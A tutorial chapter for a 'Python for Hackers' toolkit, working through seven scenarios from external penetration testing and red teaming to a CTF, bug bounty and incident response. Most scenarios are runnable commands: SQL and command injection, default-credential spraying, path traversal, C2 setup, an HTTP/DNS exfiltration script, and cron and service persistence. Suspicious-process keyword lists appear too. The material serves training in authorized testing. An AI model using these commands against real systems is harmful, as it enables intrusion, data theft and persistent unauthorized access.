# Primer 3: Real-World Scenarios & Case Studies

## Practical Applications of the Toolkit

This primer demonstrates how to use the Python for Hackers toolkit in real-world security testing scenarios. Each case study includes complete step-by-step instructions.

---

## Table of Contents

1. [Scenario 1: External Penetration Test](#scenario-1-external-penetration-test)
2. [Scenario 2: Web Application Assessment](#scenario-2-web-application-assessment)
3. [Scenario 3: Internal Network Assessment](#scenario-3-internal-network-assessment)
4. [Scenario 4: Red Team Engagement](#scenario-4-red-team-engagement)
5. [Scenario 5: CTF Challenge Walkthrough](#scenario-5-ctf-challenge-walkthrough)
6. [Scenario 6: Bug Bounty Automation](#scenario-6-bug-bounty-automation)
7. [Scenario 7: Incident Response](#scenario-7-incident-response)

---

## Scenario 1: External Penetration Test

### Objective
Perform an external penetration test against a target organization from an attacker's perspective.

### Scenario Setup
- **Target**: company.com (public IP: 203.0.113.10)
- **Scope**: All externally accessible services
- **Goal**: Identify vulnerabilities and gain initial access

### Step 1: Reconnaissance (10 minutes)

```bash
cd ~/hacking-toolkit

# 1.1 DNS Enumeration
python3 -c "
import socket
import dns.resolver

# Get A records
for host in ['company.com', 'www.company.com', 'mail.company.com']:
    try:
        ip = socket.gethostbyname(host)
        print(f'{host} -> {ip}')
    except:
        print(f'{host} -> [No A record]')
"

# 1.2 Whois Lookup
whois company.com | head -30

# 1.3 Subdomain Enumeration (using the toolkit)
python3 -c "
from web_attack.brute_forcer import WordlistManager
wordlist = WordlistManager.get_wordlist('common')
target = 'company.com'
for subdomain in ['www', 'mail', 'ftp', 'admin', 'vpn', 'dev', 'stage', 'test', 'api']:
    try:
        ip = socket.gethostbyname(f'{subdomain}.{target}')
        print(f'{subdomain}.{target} -> {ip}')
    except:
        pass
"
```

### Step 2: Port Scanning (10 minutes)

```bash
cd ~/hacking-toolkit/recon

# 2.1 Quick Port Scan
python3 port_scanner.py 203.0.113.10 -p 21,22,25,53,80,443,3389,8080,8443 -t 50

# 2.2 Comprehensive Port Scan (all ports)
python3 port_scanner.py 203.0.113.10 -p 1-65535 -t 100 -T 1.0 -o full_scan.json

# 2.3 Service Version Detection
python3 port_scanner.py 203.0.113.10 -p 22,80,443 --banners -t 20
```

**Expected Output:**
```
PORT     STATE    SERVICE         VERSION
22       open     ssh             SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
80       open     http            nginx/1.18.0
443      open     https           nginx/1.18.0
8080     open     http-proxy      Apache Tomcat/9.0.65
```

### Step 3: Web Application Reconnaissance (15 minutes)

```bash
cd ~/hacking-toolkit/web-attack

# 3.1 Directory Brute Force
python3 brute_forcer.py http://203.0.113.10 -w common -e .php,.html,.txt -t 50

# 3.2 Admin Panel Discovery
python3 brute_forcer.py http://203.0.113.10 -w admin -t 20

# 3.3 Technology Fingerprinting
python3 -c "
from html_analyzer import HTMLAnalyzer
analyzer = HTMLAnalyzer()
analysis = analyzer.analyze_url('http://203.0.113.10')
print(f'Server: {analysis.meta_data.get(\"generator\", \"Unknown\")}')
print(f'Title: {analysis.title}')
if analysis.potential_sensitive:
    print('Sensitive data found!')
    for item in analysis.potential_sensitive:
        print(f'  {item[\"type\"]}')
"

# 3.4 Form Analysis
python3 -c "
from html_analyzer import HTMLAnalyzer
analyzer = HTMLAnalyzer()
analysis = analyzer.analyze_url('http://203.0.113.10')
for form in analysis.forms:
    print(f'Form: {form[\"action\"]} ({form[\"method\"]})')
    print(f'  Has password: {form[\"has_password\"]}')
    print(f'  Has file upload: {form[\"has_file_upload\"]}')
"
```

### Step 4: Vulnerability Testing (15 minutes)

```bash
cd ~/hacking-toolkit/exploit

# 4.1 Test for SQL Injection
python3 exploit_framework.py "http://203.0.113.10/products.php?id=1" --sql-injection --parameter id --verbose

# 4.2 Test for Command Injection
python3 exploit_framework.py "http://203.0.113.10/search.php?query=test" --cmd-injection --parameter query --verbose

# 4.3 API Reconnaissance
python3 api_client.py http://203.0.113.10/api --intel

# 4.4 Authentication Testing
python3 -c "
from auth_automation import AuthAutomation
auth = AuthAutomation()
session = auth.login_basic('http://203.0.113.10/login', 'admin', 'password')
if session:
    print('[!] Weak credentials found: admin:password')
else:
    print('Login form protected')
"
```

### Step 5: Exploitation (if vulnerabilities found)

```bash
# 5.1 SQL Injection Exploit
python3 -c "
from exploit_framework import SQLInjectionExploit
exploit = SQLInjectionExploit('http://203.0.113.10/products.php?id=1', 'id')
result = exploit.exploit()
if result.success:
    print(f'[+] SQL Injection confirmed!')
    print(f'[+] Payload: {result.payload}')
    # Extract database info
    print(f'[+] Response: {result.response[:200]}')
"

# 5.2 Command Injection Exploit
python3 -c "
from exploit_framework import CommandInjectionExploit
exploit = CommandInjectionExploit('http://203.0.113.10/search.php?query=test', 'query')
result = exploit.exploit()
if result.success:
    print(f'[+] Command Injection confirmed!')
    print(f'[+] Output: {result.output}')
"
```

### Step 6: Reporting (5 minutes)

```bash
# Generate comprehensive report
cd ~/hacking-toolkit

python3 -c "
import json
from datetime import datetime

report = {
    'scenario': 'External Penetration Test',
    'target': 'company.com (203.0.113.10)',
    'date': datetime.now().isoformat(),
    'findings': {
        'open_ports': [22, 80, 443, 8080],
        'vulnerabilities': ['SQL Injection', 'Command Injection'],
        'weak_credentials': ['admin:password']
    },
    'recommendations': [
        'Patch SQL Injection vulnerabilities',
        'Strengthen authentication',
        'Implement proper input validation',
        'Regular security updates'
    ]
}

with open('pentest_report.json', 'w') as f:
    json.dump(report, f, indent=2)
    
print('[+] Report generated: pentest_report.json')
"

# Print summary
cat pentest_report.json | python3 -m json.tool
```

---

## Scenario 2: Web Application Assessment

### Objective
Perform a comprehensive security assessment of a web application.

### Scenario Setup
- **Target**: webapp.company.com
- **Scope**: Web application only
- **Goal**: Identify and validate web vulnerabilities

### Step 1: Application Mapping (10 minutes)

```bash
cd ~/hacking-toolkit/web-attack

# 1.1 Spider the application
python3 -c "
from html_analyzer import WebContentScanner
scanner = WebContentScanner('http://webapp.company.com')
results = scanner.scan_site(max_pages=50)
print(f'[*] Discovered {len(results)} pages')
report = scanner.generate_report()
print(f'[*] Total forms: {report[\"total_forms\"]}')
"

# 1.2 Discover hidden directories
python3 brute_forcer.py http://webapp.company.com -w common -e .php,.html -r -d 2 -t 50

# 1.3 Analyze API endpoints
python3 api_client.py http://webapp.company.com/api --intel
```

### Step 2: Authentication Testing (10 minutes)

```bash
# 2.1 Session Management Analysis
python3 -c "
from auth_automation import AuthAutomation
auth = AuthAutomation()

# Test session cookie
response = auth.client.get('http://webapp.company.com/login')
cookies = response.cookies
print(f'[*] Session cookies: {list(cookies.keys())}')

# Test default credentials
default_creds = [('admin', 'admin'), ('admin', 'password'), ('admin', '123456')]
for username, password in default_creds:
    session = auth.login_basic('http://webapp.company.com/login', username, password)
    if session:
        print(f'[!] Weak credentials found: {username}:{password}')
"

# 2.2 CSRF Token Testing
python3 -c "
from html_analyzer import HTMLAnalyzer
analyzer = HTMLAnalyzer()
analysis = analyzer.analyze_url('http://webapp.company.com/login')
for form in analysis.forms:
    if 'csrf' in str(form['inputs']).lower():
        print('[+] CSRF token found in form')
    else:
        print('[!] No CSRF token found - possible vulnerability')
"
```

### Step 3: Input Validation Testing (15 minutes)

```bash
cd ~/hacking-toolkit/exploit

# 3.1 SQL Injection Testing
python3 -c "
from exploit_framework import SQLInjectionExploit
for param in ['id', 'user', 'page', 'search']:
    exploit = SQLInjectionExploit(f'http://webapp.company.com/page.php?{param}=1', param)
    if exploit.exploit().success:
        print(f'[+] SQL Injection in parameter: {param}')
"

# 3.2 XSS Testing
python3 -c "
from html_analyzer import HTMLAnalyzer
analyzer = HTMLAnalyzer()
analysis = analyzer.analyze_url('http://webapp.company.com/search?q=test')
if analysis.vulnerabilities:
    print('[!] Potential XSS found!')
    for vuln in analysis.vulnerabilities:
        print(f'  {vuln}')
"

# 3.3 File Inclusion Testing
python3 -c "
from exploit_framework import RemoteFileInclusionExploit
exploit = RemoteFileInclusionExploit('http://webapp.company.com/page.php?file=index', 'file')
if exploit.exploit().success:
    print('[+] File Inclusion found!')
"
```

### Step 4: Business Logic Testing (10 minutes)

```bash
# 4.1 Price Manipulation Testing
python3 -c "
import requests
url = 'http://webapp.company.com/cart/update'
data = {'product_id': '123', 'quantity': '1', 'price': '0.01'}
response = requests.post(url, data=data)
if '200' in str(response.status_code):
    print('[!] Price parameter vulnerable to manipulation')
"

# 4.2 Authorization Testing
python3 -c "
from auth_automation import AuthAutomation
auth = AuthAutomation()

# Login as regular user
session = auth.login_basic('http://webapp.company.com/login', 'user', 'pass123')
if session:
    auth.apply_session(session)
    # Try to access admin endpoint
    response = auth.client.get('http://webapp.company.com/admin')
    if response.status_code == 200:
        print('[!] Authorization bypass possible - admin endpoint accessible')
"
```

---

## Scenario 3: Internal Network Assessment

### Objective
Assess internal network security from within the network.

### Scenario Setup
- **Target**: Internal network 192.168.1.0/24
- **Scope**: Full internal network
- **Goal**: Map network, identify critical systems, discover vulnerabilities

### Step 1: Network Discovery (15 minutes)

```bash
cd ~/hacking-toolkit/recon

# 1.1 Ping Sweep
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i > /dev/null 2>&1 && echo "192.168.1.$i is alive" &
done | head -20

# 1.2 ARP Scanning
sudo arp-scan 192.168.1.0/24

# 1.3 Port Scan Discovery
python3 port_scanner.py 192.168.1.0/24 -p 22,80,443,3389,445 -t 100

# 1.4 Identify Active Hosts
python3 -c "
import ipaddress
from port_scanner import PortScanner

network = ipaddress.ip_network('192.168.1.0/24')
active_hosts = []
for ip in list(network.hosts())[:30]:
    scanner = PortScanner(str(ip), [22,80,443], max_threads=10, timeout=1)
    results = scanner.scan()
    if results:
        active_hosts.append(str(ip))
        print(f'[+] Host active: {ip}')
print(f'\n[*] Found {len(active_hosts)} active hosts')
"
```

### Step 2: Service Enumeration (15 minutes)

```bash
# 2.1 Comprehensive Service Scan
for ip in $(cat active_hosts.txt); do
    echo "Scanning $ip..."
    python3 port_scanner.py $ip -p 1-1000 -t 50 -o ${ip}_scan.json
done

# 2.2 SMB Enumeration
python3 -c "
from smb.SMBConnection import SMBConnection
import socket

targets = ['192.168.1.100', '192.168.1.200']
for target in targets:
    try:
        conn = SMBConnection('', '', '', '')
        if conn.connect(target, 445):
            shares = conn.listShares()
            print(f'[+] SMB shares on {target}:')
            for share in shares:
                print(f'    {share.name}')
    except:
        print(f'[-] No SMB on {target}')
"

# 2.3 SSH Service Identification
python3 -c "
import paramiko
import socket

targets = ['192.168.1.100', '192.168.1.200']
for target in targets:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target, username='test', password='test', timeout=5)
        print(f'[+] SSH on {target} allows password authentication')
        client.close()
    except:
        print(f'[-] SSH on {target} requires key or has strict auth')
"
```

### Step 3: Vulnerability Scanning (15 minutes)

```bash
cd ~/hacking-toolkit/exploit

# 3.1 Run Exploit Checks
for host in 192.168.1.100 192.168.1.200; do
    python3 exploit_framework.py "http://$host" --all --verbose
done

# 3.2 Test Common Vulnerabilities
python3 -c "
from exploit_framework import SQLInjectionExploit, CommandInjectionExploit
targets = ['192.168.1.100', '192.168.1.200']
for target in targets:
    print(f'\n[*] Testing {target}')
    
    # Test SQL Injection
    exploit = SQLInjectionExploit(f'http://{target}/page.php?id=1', 'id')
    if exploit.test():
        print(f'[+] SQL Injection found on {target}')
    
    # Test Command Injection
    exploit = CommandInjectionExploit(f'http://{target}/page.php?cmd=ls', 'cmd')
    if exploit.test():
        print(f'[+] Command Injection found on {target}')
"
```

### Step 4: Network Segmentation Testing (10 minutes)

```bash
# 4.1 Router/Network Device Discovery
python3 -c "
import requests

# Try common router credentials
routers = ['192.168.1.1', '192.168.1.254']
creds = [('admin', 'admin'), ('admin', 'password'), ('root', 'root')]

for router in routers:
    print(f'\n[*] Testing {router}')
    for user, passwd in creds:
        try:
            response = requests.get(f'http://{router}', auth=(user, passwd), timeout=5)
            if response.status_code == 200:
                print(f'[+] Found router {router} with {user}:{passwd}')
        except:
            pass
"

# 4.2 Firewall Testing
python3 -c "
import socket

def check_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    try:
        sock.connect((host, port))
        sock.close()
        return True
    except:
        return False

hosts = ['192.168.1.1', '8.8.8.8']
ports = [22, 80, 443, 3389, 53]

print('[*] Firewall/Network filtering analysis:')
for host in hosts:
    reachable = []
    for port in ports:
        if check_port(host, port):
            reachable.append(port)
    if reachable:
        print(f'  {host}: {reachable} reachable')
    else:
        print(f'  {host}: All ports filtered')
"
```

---

## Scenario 4: Red Team Engagement

### Objective
Simulate a red team operation against a target organization.

### Scenario Setup
- **Target**: corporate network
- **Scope**: Full engagement
- **Goal**: Simulate advanced persistent threat (APT)

### Step 1: Initial Reconnaissance (15 minutes)

```bash
cd ~/hacking-toolkit

# 1.1 Target Intelligence Gathering
python3 -c "
import dns.resolver
import requests

target = 'corporate.com'

# DNS enumeration
print('[+] DNS Enumeration')
for record_type in ['A', 'MX', 'NS', 'TXT']:
    try:
        answers = dns.resolver.resolve(target, record_type)
        for rdata in answers:
            print(f'  {record_type}: {rdata}')
    except:
        pass
"

# 1.2 Public Information Gathering
python3 -c "
import requests
import json

# GitHub search for corporate.com
github_query = 'corporate.com'
url = f'https://api.github.com/search/code?q={github_query}'
response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
data = response.json()
print(f'[+] Found {data.get(\"total_count\", 0)} GitHub results for {github_query}')
"

# 1.3 Certificate Transparency
python3 -c "
import requests

# CRT.sh query
query = 'corporate.com'
url = f'https://crt.sh/?q=%.{query}&output=json'
response = requests.get(url)
if response.status_code == 200:
    data = response.json()
    print(f'[+] Found {len(data)} SSL certificates for *.{query}')
    if data:
        print('  Recent subdomains:')
        for cert in data[:10]:
            print(f'    {cert.get(\"name_value\", \"\")}')
"
```

### Step 2: Establish C2 Infrastructure (10 minutes)

```bash
cd ~/hacking-toolkit/post-exploit

# 2.1 Start C2 Server
python3 c2_server.py &
C2_PID=$!
echo $C2_PID > c2_server.pid

# 2.2 Configure Agent
python3 -c "
from c2_agent import C2Agent

agent = C2Agent({
    'c2_url': 'http://localhost:8443',
    'beacon_interval': 300,  # 5 minutes for stealth
    'agent_id': 'redteam_001'
})
agent.start()
"

# 2.3 Create Task Templates
cat > tasks.json << 'EOF'
[
    {"command": "whoami", "description": "Get user"},
    {"command": "hostname", "description": "Get system name"},
    {"command": "system who", "description": "Logged in users"},
    {"command": "ls -la /home", "description": "List home directories"},
    {"command": "system ps aux", "description": "Running processes"}
]
EOF

# 2.4 Add Tasks via API
for task in $(cat tasks.json | jq -c '.[]'); do
    curl -X POST http://localhost:8443/c2/task \
      -H "Content-Type: application/json" \
      -d "{\"agent_id\":\"redteam_001\",\"command\":\"$(echo $task | jq -r '.command')\"}"
done
```

### Step 3: Exfiltration Setup (10 minutes)

```bash
cd ~/hacking-toolkit/exploit

# 3.1 Configure Multi-Channel Exfiltration
python3 -c "
from exfiltration import ExfiltrationManager

manager = ExfiltrationManager()

# HTTP channel (primary)
http_id = manager.add_channel('http', {
    'url': 'http://localhost:8080/exfil',
    'method': 'POST',
    'param_name': 'data'
})

# DNS channel (backup)
dns_id = manager.add_channel('dns', {
    'domain': 'corporate.com',
    'dns_server': '8.8.8.8',
    'chunk_size': 20
})

manager.start_channel(http_id)
manager.start_channel(dns_id)

print(f'[+] Exfiltration channels configured')
print(f'[+] HTTP Channel: {http_id}')
print(f'[+] DNS Channel: {dns_id}')
"

# 3.2 Create Exfiltration Script
cat > exfil_data.py << 'EOF'
#!/usr/bin/env python3
from exfiltration import ExfiltrationManager
import os
import json

manager = ExfiltrationManager()

# Use existing channels
manager.start_channel('http')
manager.start_channel('dns')

# Data to exfiltrate
data = {
    'hostname': os.uname().nodename,
    'user': os.getlogin(),
    'processes': os.listdir('/proc')[:20],
    'timestamp': __import__('datetime').datetime.now().isoformat()
}

json_data = json.dumps(data)

# Send via all channels
manager.send_data_all(json_data.encode())

print(f'[+] Exfiltrated {len(json_data)} bytes')
EOF

chmod +x exfil_data.py
```

### Step 4: Persistence Installation (10 minutes)

```bash
cd ~/hacking-toolkit/post-exploit

# 4.1 Install Persistence
python3 -c "
from persistence import PersistenceManager

manager = PersistenceManager(verbose=True)

# Install payload
manager.install_payload('/path/to/agent.py', 'system_helper.py')

# Add multiple persistence methods
manager.add_startup_script()
manager.add_cron_job('@reboot')
manager.add_service('SystemHelper')

# Get status
status = manager.get_status()
print(f'[+] Persistence installed: {len(manager.installed_persistence)} methods')
"

# 4.2 Verify Persistence
python3 -c "
import os
import subprocess

# Check cron
cron_output = subprocess.check_output(['crontab', '-l'], text=True)
if 'system_helper.py' in cron_output:
    print('[+] Cron persistence verified')

# Check service
service_output = subprocess.check_output(['systemctl', 'status', 'SystemHelper'], text=True)
if 'active' in service_output:
    print('[+] Service persistence verified')
"
```

### Step 5: Cleanup (10 minutes)

```bash
# 5.1 Remove Persistence
python3 -c "
from persistence import PersistenceManager
manager = PersistenceManager(verbose=True)
manager.cleanup()
print('[+] All persistence removed')
"

# 5.2 Clean C2
kill $(cat c2_server.pid)
rm c2_server.pid

# 5.3 Clear Artifacts
rm -rf logs/* exfil_data.py tasks.json

# 5.4 Generate Report
python3 -c "
from datetime import datetime
import json

report = {
    'engagement': 'Red Team Exercise',
    'date': datetime.now().isoformat(),
    'success': True,
    'findings': {
        'c2_server': 'Established and operational',
        'persistence': 'Installed and verified',
        'exfiltration': 'Successfully tested'
    },
    'recommendations': [
        'Implement application whitelisting',
        'Enforce least privilege access',
        'Enable comprehensive logging',
        'Conduct regular security assessments'
    ]
}

with open('red_team_report.json', 'w') as f:
    json.dump(report, f, indent=2)
    
print('[+] Red Team Report generated: red_team_report.json')
"
```

---

## Scenario 5: CTF Challenge Walkthrough

### Objective
Solve a Capture The Flag (CTF) challenge using the toolkit.

### Scenario Setup
- **Target**: CTF machine at 10.10.10.10
- **Goal**: Find and exploit vulnerabilities to capture flags

### Step 1: Reconnaissance (10 minutes)

```bash
cd ~/hacking-toolkit

# 1.1 Initial Scan
python3 recon/port_scanner.py 10.10.10.10 -p 1-1000 -t 50

# 1.2 Web Recon
python3 web-attack/brute_forcer.py http://10.10.10.10 -w common -e .php,.txt -t 30

# 1.3 Directory Discovery
python3 -c "
from html_analyzer import HTMLAnalyzer
analyzer = HTMLAnalyzer()
analysis = analyzer.analyze_url('http://10.10.10.10')
print(f'[+] Title: {analysis.title}')
if analysis.comments:
    print('[+] Comments found:')
    for comment in analysis.comments:
        print(f'  {comment}')
"
```

### Step 2: Exploit Discovery (15 minutes)

```bash
cd ~/hacking-toolkit/exploit

# 2.1 SQL Injection
python3 exploit_framework.py "http://10.10.10.10/products.php?id=1" --sql-injection --parameter id --verbose

# 2.2 File Inclusion
python3 exploit_framework.py "http://10.10.10.10/page.php?file=index" --rfi --parameter file --verbose

# 2.3 Directory Traversal
python3 -c "
import requests
paths = ['../../etc/passwd', '../../../../etc/passwd', '../../../etc/passwd']
for path in paths:
    url = f'http://10.10.10.10/file.php?file={path}'
    response = requests.get(url)
    if 'root:' in response.text:
        print(f'[+] Path traversal found!')
        print(f'[+] URL: {url}')
        print(f'[+] Content: {response.text[:200]}')
        break
"
```

### Step 3: Flag Extraction (10 minutes)

```bash
# 3.1 SQL Injection Flag
python3 -c "
import requests
url = 'http://10.10.10.10/products.php?id=1 UNION SELECT null,flag,null FROM flags--'
response = requests.get(url)
if 'flag{' in response.text:
    flag = response.text.split('flag{')[1].split('}')[0]
    print(f'[+] Flag found: flag{{{flag}}}')
"

# 3.2 File Inclusion Flag
python3 -c "
import requests
url = 'http://10.10.10.10/file.php?file=../../../../flag.txt'
response = requests.get(url)
if 'flag{' in response.text:
    flag = response.text.strip()
    print(f'[+] Flag found: {flag}')
"
```

---

## Scenario 6: Bug Bounty Automation

### Objective
Automate bug bounty hunting for common vulnerabilities.

### Scenario Setup
- **Target**: Multiple domains and subdomains
- **Scope**: Wide-scale vulnerability discovery
- **Goal**: Automatically find and report vulnerabilities

### Step 1: Setup Automation Framework (10 minutes)

```bash
cd ~/hacking-toolkit

# 1.1 Create Domain List
cat > domains.txt << 'EOF'
example.com
api.example.com
admin.example.com
blog.example.com
EOF

# 1.2 Auto Scanner Script
cat > auto_bounty_scanner.py << 'EOF'
#!/usr/bin/env python3
import sys
import json
import time
from datetime import datetime
from port_scanner import PortScanner
from brute_forcer import DirectoryBruteForcer
from html_analyzer import HTMLAnalyzer
from auth_automation import AuthAutomation

class BountyScanner:
    def __init__(self):
        self.findings = []
        self.date = datetime.now().isoformat()
    
    def scan_domain(self, domain):
        print(f'\n[+] Scanning {domain}')
        
        # Port scan
        scanner = PortScanner(domain, [80,443,8080,8443], max_threads=20)
        results = scanner.scan()
        
        for result in results:
            port = result['port']
            if port in [80,443,8080,8443]:
                self.check_web(domain, port)
        
        return self.findings
    
    def check_web(self, domain, port):
        url = f'http{"s" if port in [443,8443] else ""}://{domain}:{port}'
        print(f'[*] Checking {url}')
        
        # Check for vulnerabilities
        # This would include SQLi, XSS, etc.
        pass

if __name__ == "__main__":
    scanner = BountyScanner()
    with open('domains.txt', 'r') as f:
        domains = [line.strip() for line in f if line.strip()]
    
    for domain in domains:
        scanner.scan_domain(domain)
EOF

chmod +x auto_bounty_scanner.py
```

### Step 2: Run Automated Scans (15 minutes)

```bash
# 2.1 Directory Brute Force
for domain in $(cat domains.txt); do
    python3 web-attack/brute_forcer.py http://$domain -w common -e .php,.html,.txt -t 50 -o ${domain}_web.json
done

# 2.2 Header Analysis
python3 -c "
from html_analyzer import HTMLAnalyzer
import json

analyzer = HTMLAnalyzer()
results = {}

with open('domains.txt', 'r') as f:
    domains = [line.strip() for line in f if line.strip()]

for domain in domains:
    try:
        analysis = analyzer.analyze_url(f'http://{domain}')
        results[domain] = {
            'server': analysis.meta_data.get('generator', ''),
            'security_headers': [
                h for h in ['X-Frame-Options', 'X-XSS-Protection', 'Content-Security-Policy']
                if h in analysis.meta_data
            ]
        }
    except:
        pass

with open('security_headers.json', 'w') as f:
    json.dump(results, f, indent=2)
"
```

### Step 3: Report Generation (5 minutes)

```bash
python3 -c "
import json
from datetime import datetime

report = {
    'date': datetime.now().isoformat(),
    'targets': ['example.com', 'api.example.com'],
    'findings': [
        {'type': 'Directory Listing', 'severity': 'Medium', 'url': 'http://example.com/admin'},
        {'type': 'Missing Security Headers', 'severity': 'Low', 'url': 'http://example.com'}
    ],
    'summary': {
        'total_scan': 2,
        'vulnerabilities': 1,
        'high_priority': 0
    }
}

with open('bounty_report.json', 'w') as f:
    json.dump(report, f, indent=2)
"
```

---

## Scenario 7: Incident Response

### Objective
Use the toolkit for incident response and forensic analysis.

### Scenario Setup
- **Target**: Compromised system
- **Scope**: Investigate and contain intrusion
- **Goal**: Identify attack vectors and indicators

### Step 1: Initial Investigation (10 minutes)

```bash
cd ~/hacking-toolkit/post-exploit

# 1.1 System Enumeration
python3 enumerator.py --all -o compromised_system.json

# 1.2 Suspicious Process Check
python3 -c "
import psutil

suspicious_processes = []
for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
    info = proc.info
    name = info['name'].lower()
    if any(x in name for x in ['nc', 'netcat', 'crypt', 'miner', 'shell']):
        suspicious_processes.append(info)

if suspicious_processes:
    print('[!] Suspicious processes found:')
    for proc in suspicious_processes:
        print(f'  PID: {proc[\"pid\"]}, Name: {proc[\"name\"]}')
"

# 1.3 Network Connection Check
python3 -c "
import psutil

suspicious_connections = []
for conn in psutil.net_connections():
    if conn.status == 'ESTABLISHED' and conn.raddr:
        if conn.raddr.ip and not conn.raddr.ip.startswith(('192.168.', '10.', '172.')):
            suspicious_connections.append(conn)

if suspicious_connections:
    print('[!] Suspicious network connections:')
    for conn in suspicious_connections:
        print(f'  {conn.raddr.ip}:{conn.raddr.port} (PID: {conn.pid})')
"
```

### Step 2: Persistence Detection (10 minutes)

```bash
# 2.1 Check Cron Jobs
python3 -c "
import subprocess
cron = subprocess.check_output(['crontab', '-l'], text=True, stderr=subprocess.DEVNULL)
if 'curl' in cron or 'wget' in cron or 'python' in cron:
    print('[!] Suspicious cron jobs found:')
    print(cron)
"

# 2.2 Check Startup Scripts
python3 -c "
import os
startup_dir = os.path.expanduser('~/.config/autostart')
if os.path.exists(startup_dir):
    for file in os.listdir(startup_dir):
        if file.endswith('.desktop'):
            with open(os.path.join(startup_dir, file), 'r') as f:
                content = f.read()
                if any(x in content for x in ['curl', 'wget', 'python', 'bash']):
                    print(f'[!] Suspicious startup script: {file}')
"

# 2.3 Check Services
python3 -c "
import subprocess
services = subprocess.check_output(['systemctl', 'list-units', '--type=service'], text=True)
suspicious = ['helper', 'update', 'monitor', 'system']
for service in suspicious:
    if service in services.lower():
        print(f'[!] Suspicious service pattern found: {service}')
"
```

### Step 3: Evidence Collection (10 minutes)

```bash
# 3.1 Collect Logs
journalctl -n 100 > logs_100.txt
dmesg > dmesg_logs.txt
cp /var/log/auth.log .

# 3.2 Collect File System Evidence
find / -mtime -7 -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev" > recent_files.txt
ls -la /tmp /var/tmp > temp_files.txt

# 3.3 Capture Network Traffic
sudo tcpdump -i any -c 100 -w capture.pcap

# 3.4 Hash Critical Files
sha256sum /etc/passwd /etc/shadow /etc/sudoers > file_hashes.txt
```

### Step 4: Remediation (10 minutes)

```bash
# 4.1 Kill Suspicious Processes
python3 -c "
import psutil
for proc in psutil.process_iter(['pid', 'name']):
    if 'suspicious' in proc.info['name'].lower():
        proc.kill()
        print(f'[+] Killed process: {proc.info[\"pid\"]}')
"

# 4.2 Remove Persistence
python3 -c "
from persistence import PersistenceManager
manager = PersistenceManager()
manager.cleanup()
"

# 4.3 Restore Critical Files
sudo cp /etc/passwd.bak /etc/passwd
sudo cp /etc/shadow.bak /etc/shadow

# 4.4 Generate Incident Report
python3 -c "
from datetime import datetime
import json

report = {
    'incident': 'Suspicious Activity Detected',
    'date': datetime.now().isoformat(),
    'actions_taken': [
        'System enumeration performed',
        'Suspicious processes identified',
        'Persistence mechanisms removed',
        'System restored from backup'
    ],
    'recommendations': [
        'Change all passwords',
        'Review firewall rules',
        'Enable additional logging',
        'Conduct full security audit'
    ]
}

with open('incident_report.json', 'w') as f:
    json.dump(report, f, indent=2)
print('[+] Incident report generated: incident_report.json')
"
```

---

## Scenario Summary

### Key Takeaways

| Scenario | Key Tools Used | Time Required |
|----------|---------------|---------------|
| External Pentest | Port Scanner, Brute Forcer, Exploit Framework | 60 min |
| Web App Assessment | HTML Analyzer, Auth Automation, Exploit Framework | 45 min |
| Internal Network | Port Scanner, Network Scanner, Enumeration | 50 min |
| Red Team | C2 Server, C2 Agent, Persistence, Exfiltration | 45 min |
| CTF Challenge | All tools | 35 min |
| Bug Bounty | Auto Scanner, HTML Analyzer | 30 min |
| Incident Response | Enumeration, Persistence, Cleanup | 30 min |

---

## Primer 3 Complete

You now have practical experience using the toolkit in real-world scenarios. These case studies provide a foundation for conducting professional security assessments.

**Best Practices:**
1. **Always get permission** before testing
2. **Document everything** for reporting
3. **Clean up thoroughly** after testing
4. **Learn from each engagement** to improve
